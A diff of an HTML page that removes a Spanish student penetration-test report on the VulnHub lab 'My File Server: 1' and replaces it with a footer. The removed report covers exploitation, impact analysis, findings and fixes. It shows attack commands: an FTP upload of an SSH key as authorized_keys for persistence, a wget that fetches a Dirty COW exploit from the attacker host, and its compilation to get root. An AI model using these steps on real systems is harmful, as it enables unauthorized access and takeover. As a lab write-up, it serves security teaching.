-<p>En dicho resultado se confirmó que el servicio FTP permite el inicio de sesión anónimo ("Anonymous FTP login allowed") y que la firma de mensajes SMB se encuentra deshabilitada ("message signing: disabled (dangerous, but default)"), lo cual representa una configuración insegura por defecto. Con las credenciales smbuser / rootroot1 obtenidas y los servicios FTP y SSH disponibles, se dio paso a la fase de explotación.</p>
-
-<hr>
-
-<h2>6. Explotación</h2>
-<p>Una vez obtenidas las credenciales (smbuser y rootroot1) durante la fase de enumeración, se procedió a buscar una vía para establecer una conexión estable y segura con la máquina víctima. Dado que en el escaneo de puertos inicial se identificó que tanto el servicio FTP (puerto 21) como el SSH (puerto 22) se encontraban abiertos, la estrategia consistió en generar un par de llaves SSH locales, subir la llave pública a través del servicio FTP y, finalmente, acceder mediante SSH sin necesidad de proporcionar la contraseña repetidamente.</p>
-<p>Para comenzar, se generó un par de llaves (pública y privada) en la máquina atacante Kali Linux mediante el siguiente comando:</p>
-<p><code>sudo ssh-keygen</code></p>
-<p>Al ejecutar este comando, la herramienta genera una llave criptográfica (en este caso, del tipo ed25519) que sirve para autenticarse en servidores remotos de forma segura. Se aceptaron las rutas por defecto y se dejó la frase de contraseña (passphrase) en blanco para agilizar el acceso.</p>
-<p class="lab-caption">LAB6.9: Generación de un par de llaves SSH (ed25519) en el equipo atacante.</p>
-
-<p>Una vez generada la llave, el siguiente paso consistió en introducirla en la máquina víctima. Para ello, se estableció una conexión mediante el protocolo FTP con el siguiente comando:</p>
-<p><code>ftp 192.168.56.103</code></p>
-<p>Tras introducir el usuario smbuser y la contraseña descubierta rootroot1, se obtuvo acceso exitoso al servicio FTP. Una vez dentro de la sesión, se utilizaron los siguientes comandos internos de FTP para preparar el directorio y subir el archivo:</p>
-<ul>
-    <li><code>mkdir .ssh</code>: se creó un directorio oculto llamado .ssh en la carpeta raíz del usuario, destinado a almacenar las configuraciones de conexión segura.</li>
-    <li><code>cd .ssh</code>: se ingresó a dicho directorio.</li>
-    <li><code>put /root/.ssh/id_ed25519.pub authorized_keys</code>: se utilizó el parámetro put para transferir la llave pública generada en la máquina atacante hacia la máquina víctima, renombrando el archivo a authorized_keys, nombre estándar que el servicio SSH busca para validar llaves autorizadas.</li>
-</ul>
-<p class="lab-caption">LAB6.10: Autenticación FTP con las credenciales obtenidas y carga de la llave pública como authorized_keys.</p>
-
-<p>Con la llave pública configurada correctamente en el directorio del usuario víctima, se procedió a iniciar sesión en el sistema a través del servicio SSH. Para ello se ejecutó el siguiente comando:</p>
-<p><code>ssh smbuser@192.168.56.103</code></p>
-<p>Se utilizó ssh seguido del nombre de usuario y la dirección IP objetivo. Dado que la llave pública ya formaba parte de los archivos autorizados, el servidor autenticó la conexión automáticamente sin solicitar contraseña.</p>
-<p class="lab-caption">LAB6.11: Acceso exitoso al servidor vía SSH utilizando la llave previamente autorizada.</p>
-
-<p>Al observar el resultado, se confirmó el acceso inicial al sistema operativo como el usuario de bajos privilegios smbuser, con lo cual se dio paso a la fase de escalada de privilegios.</p>
-
-<hr>
-
-<h2>7. Escalada de Privilegios</h2>
-<p>Una vez obtenido el acceso inicial a la máquina objetivo mediante el usuario con privilegios limitados smbuser, se procedió a la fase de post-explotación con el objetivo de elevar los privilegios y obtener el control total del sistema (root).</p>
-<p>El primer paso consistió en realizar una enumeración interna del sistema operativo para identificar posibles vectores de escalada. Para ello se verificó la versión del kernel de Linux ejecutando el siguiente comando:</p>
-<p><code>uname -a</code></p>
-<p>El sistema devolvió la siguiente información: <code>Linux fileserver 3.10.0-229.el7.x86_64 #1 SMP Fri Mar 6 11:36:42 UTC 2015 x86_64 GNU/Linux</code>. Al analizar esta versión del kernel, se determinó que el sistema era vulnerable a CVE-2016-5195, una falla crítica de condición de carrera en la gestión de memoria de Linux, también conocida como Dirty COW. Esta vulnerabilidad permite a un usuario local sin privilegios escribir en mapeos de memoria de solo lectura, lo que facilita la modificación de archivos críticos del sistema, como /usr/bin/passwd, para obtener una consola con acceso root.</p>
-<p>Para explotar esta vulnerabilidad, se descargó el código fuente del exploit público (40616.c) desde la máquina atacante hacia el servidor objetivo. Esto se logró levantando un servidor HTTP temporal en Kali y utilizando la herramienta wget en la máquina víctima:</p>
-<p><code>wget http://192.168.56.101:8080/40616.c</code></p>
-<p>Una vez alojado el archivo en el directorio del usuario smbuser, se procedió a compilar el código fuente en lenguaje C directamente en la máquina víctima, utilizando gcc e incluyendo la librería pthread, necesaria para el manejo de hilos que explotan la condición de carrera:</p>
-<p><code>gcc 40616.c -o exploit-pthread</code></p>
-<p class="lab-caption">LAB6.12: Descarga del exploit (40616.c) y compilación con gcc en el host comprometido.</p>
-
-<p>Finalmente, se ejecutó el binario compilado. El exploit comenzó su proceso realizando un respaldo del archivo /usr/bin/passwd en el directorio <code>/tmp/bak</code>, y procedió a sobrescribirlo aprovechando la condición de carrera en el subsistema de memoria del kernel (copy-on-write):</p>
-<p><code>./exploit</code></p>
-<p>Tras unos segundos de ejecución para completar la condición de carrera, el exploit logró sobrescribir el archivo exitosamente y devolvió una consola. Se verificó el éxito de la escalada al observar que el prompt cambió a <code>[root@fileserver smbuser]#</code>, confirmando que todo el proceso de escalada de privilegios funcionó correctamente.</p>
-<p class="lab-caption">LAB6.13: Ejecución del exploit Dirty COW: el hilo de carrera sobrescribe /usr/bin/passwd y entrega una shell root.</p>
-
-<p>Para confirmar de manera definitiva la obtención de privilegios de administrador, se ejecutó el comando id, el cual mostró <code>uid=0(root)</code>, <code>gid=1000(foo)</code>, <code>groups=1000(foo)</code>, evidenciando el compromiso total del sistema.</p>
-<p class="lab-caption">LAB6.14: Confirmación de privilegios root (uid=0) tras la explotación de CVE-2016-5195.</p>
-
-<p>Como paso final y de control posterior en la infraestructura del laboratorio, se procedió a validar el estado del sistema tras la simulación de ataque y asegurar la trazabilidad de los hallazgos documentados.</p>
-<p class="lab-caption">LAB6.15: Verificación final del entorno de pruebas tras el compromiso completo del sistema.</p>
-
-<hr>
-
-<h2>8. Análisis de Impacto (Modelo CIA)</h2>
-<p>A continuación se describe el impacto del compromiso identificado sobre los tres pilares fundamentales de la seguridad de la información: Confidencialidad, Integridad y Disponibilidad.</p>
-<ul>
-    <li><strong>Confidencialidad (Impacto Alto):</strong> La confidencialidad del sistema se vio severamente comprometida desde las etapas iniciales de la prueba. El vector de entrada principal se originó por la exposición de información sensible a través del servicio web, en el archivo readme.txt, el cual reveló la contraseña rootroot1. Este fallo de configuración permitió el acceso inicial a la cuenta smbuser. Posteriormente, al ejecutar el exploit de escalada de privilegios y obtener acceso a la consola de la víctima como root, se logró el acceso total a cualquier archivo, base de datos o información confidencial alojada en el servidor, sin ninguna restricción.</li>
-    <li><strong>Integridad (Impacto Alto):</strong> La integridad de los datos y del sistema operativo fue vulnerada en múltiples puntos durante la explotación. En primer lugar, se logró modificar la estructura de directorios del usuario al crear la carpeta oculta .ssh y cargar un archivo no autorizado al servidor, como la llave pública authorized_keys transferida vía FTP. El impacto más crítico se dio durante la explotación de Dirty COW, donde se aprovechó una condición de carrera para sobrescribir de forma forzada el binario crítico del sistema /usr/bin/passwd, lo que derivó en la obtención de una consola con acceso root.</li>
-    <li><strong>Disponibilidad (Impacto Medio):</strong> Si bien el objetivo principal de la prueba de penetración no contempló ataques de denegación de servicio, se realizaron procedimientos que podrían haber comprometido la disponibilidad del servidor. La explotación de vulnerabilidades de corrupción de memoria, como ocurre con Dirty COW, provoca inestabilidad en el kernel del sistema durante la manipulación de los hilos de ejecución. Además, al sobrescribir binarios esenciales para la autenticación como /usr/bin/passwd, se interrumpe la capacidad de los usuarios legítimos para iniciar sesión o administrar el servidor; de no restaurarse correctamente el archivo original desde la copia de seguridad generada en /tmp/bak, el sistema pudo haber requerido un reinicio forzado o mantenimiento, afectando la continuidad del servicio.</li>
-</ul>
-
-<table>
-    <tr><th>Pilar</th><th>Nivel</th><th>Descripción del impacto</th></tr>
-    <tr><td>Confidencialidad</td><td>Crítico</td><td>Divulgación de credenciales en texto plano (readme.txt) y acceso de lectura a recursos SMB/FTP sin autenticación, exponiendo archivos del servidor a cualquier usuario de la red.</td></tr>
-    <tr><td>Integridad</td><td>Crítico</td><td>Escritura no autorizada habilitada en el recurso SMB "smbdata" y en el home del usuario vía FTP (subida de authorized_keys); la escalada de privilegios a root permite modificar cualquier archivo del sistema.</td></tr>
-    <tr><td>Disponibilidad</td><td>Alto</td><td>El acceso root obtenido permite detener servicios, modificar configuraciones críticas o eliminar datos, lo que podría provocar una interrupción total del servicio de archivos.</td></tr>
-</table>
-
-<hr>
-
-<h2>9. Recomendaciones Técnicas</h2>
-<p>Para mejorar la seguridad de la máquina My File Server se proponen varias medidas enfocadas en reducir riesgos y evitar accesos no autorizados. En primer lugar, es necesario atender la exposición de datos que compromete la confidencialidad del sistema: se debe eliminar inmediatamente el archivo readme.txt expuesto en los directorios del servicio web, ya que en su contenido se revela una contraseña en texto plano. Además, es importante cambiar la contraseña del usuario smbuser, debido a que el uso de credenciales predeterminadas o triviales representa una configuración insegura que puede ser aprovechada fácilmente por un atacante.</p>
-<p>También es necesario fortalecer la integridad de los servicios de red mediante el bastionado del servicio FTP. Para ello se deben restringir los privilegios de escritura dentro del servicio, evitando que un actor malicioso pueda crear directorios ocultos como .ssh y subir archivos como authorized_keys. De esta forma se impide que un atacante pueda evadir el mecanismo de autenticación tradicional del servicio SSH y obtener acceso al sistema sin contar con credenciales válidas de forma repetida. De manera complementaria, se recomienda deshabilitar el acceso anónimo al servicio FTP y deshabilitar las sesiones nulas (NULL session) en Samba, forzando además la firma de mensajes (SMB signing) en todos los recursos compartidos.</p>
-<p>Asimismo, se recomienda actualizar el servidor Apache httpd a una versión soportada, deshabilitar el método HTTP TRACE y desactivar el listado de directorios, agregando las cabeceras de seguridad recomendadas (Content-Security-Policy, X-Content-Type-Options, Strict-Transport-Security y Referrer-Policy). De igual forma, se sugiere restringir mediante firewall el acceso a los servicios RPC, NFS y mountd, permitiendo únicamente la conexión de hosts autorizados.</p>
-<p>Finalmente, es fundamental implementar una adecuada gestión de parches y actualizaciones, ya que el sistema utiliza un kernel antiguo (Linux fileserver 3.10.0-229.el7.x86_64). Se recomienda actualizarlo a una versión reciente y estable para corregir vulnerabilidades conocidas; en particular, esta actualización debe mitigar la vulnerabilidad CVE-2016-5195 (Dirty COW), la cual aprovecha una condición de carrera que permite a usuarios sin privilegios sobrescribir archivos críticos del sistema, como /usr/bin/passwd, derivando en la obtención de privilegios de root. Se recomienda, además, establecer un proceso formal de gestión de parches y monitoreo de cambios en archivos sensibles, como ~/.ssh/authorized_keys, para detectar oportunamente intentos de persistencia no autorizados.</p>
-
-<hr>
-
-<h2>10. Tabla de Hallazgos</h2>
-<p>La siguiente tabla consolida todos los hallazgos identificados durante el ejercicio, con su severidad, evidencia, impacto y recomendación asociada.</p>
-<table>
-    <tr>
-        <th>ID</th>
-        <th>Vulnerabilidad</th>
-        <th>Severidad</th>
-        <th>Evidencia</th>
-        <th>Impacto</th>
-        <th>Recomendación</th>
-    </tr>
-    <tr>
-        <td>F-01</td>
-        <td>Divulgación de información sensible en archivo público (readme.txt)</td>
-        <td>Alta</td>
-        <td>GET http://192.168.56.103/readme.txt devuelve en texto plano: "My Password is rootroot1".</td>
-        <td>Compromiso de confidencialidad. La credencial expuesta permitió autenticación como el usuario smbuser en servicios FTP y SSH.</td>
-        <td>Eliminar archivos de prueba/desarrollo del webroot en producción; nunca almacenar credenciales en texto plano accesible públicamente.</td>
-    </tr>
-    <tr>
-        <td>F-02</td>
-        <td>FTP anónimo habilitado y servicio FTP duplicado (vsftpd 3.0.2/ProFTPD 1.3.5)</td>
-        <td>Media</td>
-        <td>nmap confirma "Anonymous FTP login allowed (FTP code 230)" en el puerto 21; ProFTPD 1.3.5 expuesto adicionalmente en el puerto 2121.</td>
-        <td>Permite enumeración de archivos y, combinado con F-01, autenticación y escritura de archivos (incluida .ssh/authorized_keys) en el servidor.</td>
-        <td>Deshabilitar el acceso anónimo FTP, restringir el acceso de escritura al home del usuario y mantener los servicios FTP actualizados o migrarlos a SFTP/FTPS.</td>
-    </tr>
-    <tr>
-        <td>F-03</td>
-        <td>Persistencia mediante subida de llave pública SSH vía FTP (home writable)</td>
-        <td>Alta</td>
-        <td>Tras autenticar por FTP con las credenciales de F-01, se subió exitosamente id_ed25519.pub como ~/.ssh/authorized_keys, habilitando acceso SSH sin contraseña.</td>
-        <td>Un atacante obtiene acceso remoto persistente e interactivo (SSH) sin necesidad de reutilizar la contraseña original.</td>
-        <td>Restringir permisos de escritura del directorio home vía FTP, deshabilitar FTP para cuentas con acceso SSH y monitorear cambios en archivos authorized_keys.</td>
-    </tr>
-    <tr>
-        <td>F-04</td>
-        <td>Sesión nula SMB con recurso compartido de lectura/escritura (smbdata)</td>
-        <td>Alta</td>
-        <td>smbmap -H 192.168.56.103 muestra sesión NULL establecida y el recurso "smbdata" con permisos READ, WRITE; Samba smbd 4.9.1 con firma de mensajes deshabilitada.</td>
-        <td>Permite a un atacante no autenticado leer y escribir archivos arbitrarios en el recurso compartido, y facilita ataques de relay SMB al no exigirse firma de mensajes.</td>
-        <td>Deshabilitar sesiones nulas (restrict anonymous), forzar SMB signing, aplicar control de acceso por usuario a los recursos compartidos.</td>
-    </tr>
-    <tr>
-        <td>F-05</td>
-        <td>Exposición innecesaria de servicios NFS/rpcbind/mountd</td>
-        <td>Media</td>
-        <td>nmap -p- -sV reporta puertos 111/tcp (rpcbind), 2049/tcp (nfs_acl) y 20048/tcp (mountd) abiertos y accesibles desde la red.</td>
-        <td>Amplía la superficie de ataque; RPC/NFS mal configurados pueden permitir montaje no autorizado de sistemas de archivos.</td>
-        <td>Restringir NFS/rpcbind mediante firewall a hosts autorizados, revisar /etc/exports y deshabilitar servicios no utilizados.</td>
-    </tr>
-    <tr>
-        <td>F-06</td>
-        <td>Servidor web desactualizado y cabeceras de seguridad ausentes (Apache 2.4.6 CentOS)</td>
-        <td>Media</td>
-        <td>Nikto reporta Apache/2.4.6 como desactualizado, método HTTP TRACE habilitado (vulnerable a XST), listado de directorios en /icons/, y ausencia de Content-Security-Policy, X-Content-Type-Options, Strict-Transport-Security y Referrer-Policy.</td>
-        <td>Incrementa el riesgo de explotación de vulnerabilidades conocidas del stack y facilita ataques de cross-site tracing y clickjacking.</td>
-        <td>Actualizar Apache httpd, deshabilitar el método TRACE, desactivar el listado de directorios y agregar las cabeceras de seguridad recomendadas.</td>
-    </tr>
-    <tr>
-        <td>F-07</td>
-        <td>Escalada de privilegios local vía Dirty COW (CVE-2016-5195)</td>
-        <td>Crítica</td>
-        <td>Kernel Linux 3.10.0-229.el7.x86_64, vulnerable a CVE-2016-5195. Tras obtener acceso SSH como smbuser, se compiló y ejecutó el exploit público correspondiente, confirmando escalada a root mediante id (uid=0(root)).</td>
-        <td>Compromiso total del sistema (confidencialidad, integridad y disponibilidad). Un atacante con acceso de usuario estándar puede obtener control total del host.</td>
-        <td>Aplicar de inmediato los parches del kernel que corrigen CVE-2016-5195 o actualizar a una versión de kernel soportada; establecer un proceso formal de gestión de parches.</td>
-    </tr>
-</table>
-
-<hr>
-
-<h2>Referencias técnicas</h2>
-<ul>
-    <li>SecWiki. (s. f.). GitHub - SecWiki/linux-kernel-exploits: linux-kernel-exploits Linux 平台提权漏洞集合. GitHub. https://github.com/SecWiki/linux-kernel-exploits/tree/master</li>
-    <li>Armour Infosec. (2020). My File Server: 1. VulnHub. https://www.vulnhub.com/entry/my-file-server-1,374/</li>
-    <li>Offensive Security. (s. f.). Nmap Reference Guide. Nmap.org. https://nmap.org/book/man.html</li>
-</ul>
+    <!-- PIE DE PÁGINA -->
+    <footer class="py-10 text-center border-t border-gray-100 bg-white">
+        <p class="text-gray-500 text-xs mb-2 px-4">
+            🔒 Sitio web protegido con <strong class="text-gray-800 font-medium">Certificado de Seguridad (HTTPS)</strong>.
+        </p>
+        <p class="text-gray-400 text-[11px] px-4 tracking-wider uppercase font-medium">
+            © 2026 Fabiola Calvillo Galván. CNO IV - Seguridad Informática.
+        </p>
+    </footer>
 
 </body>
 </html>
